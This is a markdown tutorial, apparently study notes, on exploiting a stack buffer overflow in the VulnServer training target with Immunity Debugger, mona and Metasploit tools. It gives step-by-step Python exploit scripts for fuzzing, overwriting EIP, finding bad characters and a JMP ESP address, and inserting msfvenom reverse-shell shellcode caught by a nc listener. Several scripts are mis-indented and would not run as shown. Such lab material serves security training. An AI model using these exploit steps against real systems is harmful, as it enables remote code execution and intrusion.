# Buffer Overflows
A buffer overflow occurs when memory isn't able to contain all of the data or charactrers inside of the buffer space and the data starts to spill over into the Extended Intruction Pointer (EIP) or Return Address. The return address can be used to point to addresses that it is instructed to. Steps to conduct a BoF consists of:\
- Spiking
- Fuzzing
- Finding the offset
- Overwritting the EIP
- Finding bad characters
- Finding the right module
- Getting shellcode

### Hardware/Software
- Windows VM
- VulnServer - GrayCorner
- Immunity Debugger
- generic_send_tcp

### Spiking
Spiking essentially looks for what is "breakable"

Use [generic_send_tcp](https://github.com/guilhermeferreira/spikepp/blob/master/SPIKE/src/generic_send_tcp.c) to test out with something similiar to below
s_readline();
s_string("STATS ");
s_string_variable("0");

After fuzzing the different vulnerable service commands, look at immunity debugger to find which will allow the buffer space to be over written.

### Fuzzing
Similar to spiking, but honed down to one vulnerable command, and seeing the byte place that causes the crash

```python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = "TRUN /.:/" + buffer
            
            s.send((payload.encode()))
            s.close()
            sleep(1)
            buffer = buffer + "A"*100
            
       except:
            print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
            sys.exit
```

### Finding the Offset
- metasploits pattern_create can generate code to send based off of `-l` and the byte length you want
- after the code has been generated you can modify the script used during fuzzing and put it in there

```python
import sys, socket

offset = "<pattern_create_code_here>"

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = "TRUN /.:/" + offset
            
            s.send((payload.encode()))
            s.close()
            
       except:
            print ("Error connecting to server")
            sys.exit
```

- from immunity, copy the code that is shown by the EIP
- use metasploit's pattern_offset with `-l length` `-q code_from_immunity`
- pattern_offset will tell you the exact byte offset to control the EIP

### Overwriting the EIP
To test the EIP overwrite, try:
```python
import sys, socket

shellcode = "A" * byte_offset + "B" * 4

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = "TRUN /.:/" + shellcode
            
            s.send((payload.encode()))
            s.close()
            
       except:
            print ("Error connecting to server")
            sys.exit
```

- This will allow you to see the EIP over written with exactly 4 bytes. If it is not, you have the byte_offset wrong

### Finding Bad Characters
- [badchars](https://github.com/cytopia/badchars)
- copy the badchars output in your language of choice
- edit the script to match

```python
import sys, socket

badchars = ( b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 

shellcode = "A" * byte_offset + "B" * 4 + badchars

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = "TRUN /.:/" + shellcode
            
            s.send((payload.encode()))
            s.close()
            
       except:
            print ("Error connecting to server")
            sys.exit
```
- Run this and then look at the ESP hexdump in immunity
- The goal is to find any hex that is out of place (i.e. 11 13 14)
- If hex values are displayed as something different than what it should be, those are considered bad characters and 
- When there are repetitive bad characters, say it should be 10 11 but the hex dump shows A1 A1, the only bad character is 10, not 11

- can also set directory for mona `!mona config  -set workingfolder c:\mona`
- can then generate bad character payload with mona `!mona bytearray -cpb "\x00"`
- fire off script
- use mona to find badchars `!mona compare -f c:\mona\bytearray.bin -a ESP_CODE_HERE`

### Finding the Right Object
In this step you need to find a dll or similar that has no memory protections
- mona modules for immunity debugger
- paste it in (C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands)
- type `:mona modules` in immunity and look for protection settings
- Use metasploits nasm_shell to get the hex equivalent of JMP ESP
- type `:monafind -s "\xff\xe4" -m something.dll`
- or use `!mona jmp -r ESP -m "something.dll"` to skip the previous 2
- edit python script as follows:

```python
import sys, socket

shellcode = "A" * byte_offset + "\xaf\x11\x50\x62"

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = "TRUN /.:/" + shellcode
            
            s.send((payload.encode()))
            s.close()
            
       except:
            print ("Error connecting to server")
            sys.exit
```
- click blue arrow on immunity and add jump code, visit that point, press f2 to set a breakpoint
- execute script
- check if breakpoint was hit in immunity

### Generate Shellcode
- use msfvenom to generate a reverse tcp payload
- ensure to set filetype `-f`, archetexture `-a`, and bad characters `-b`
- edit the python script as follows:

```python
import sys, socket

overflow = (b"PASTE_PAYLOAD_HERE")

shellcode = b"A" * byte_offset + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            payload = b"TRUN /.:/" + shellcode
            
            s.send((payload))
            s.close()
            
       except:
            print ("Error connecting to server")
            sys.exit
```
- set up a nc listener and wait for shell access


##HAPPY HACKING
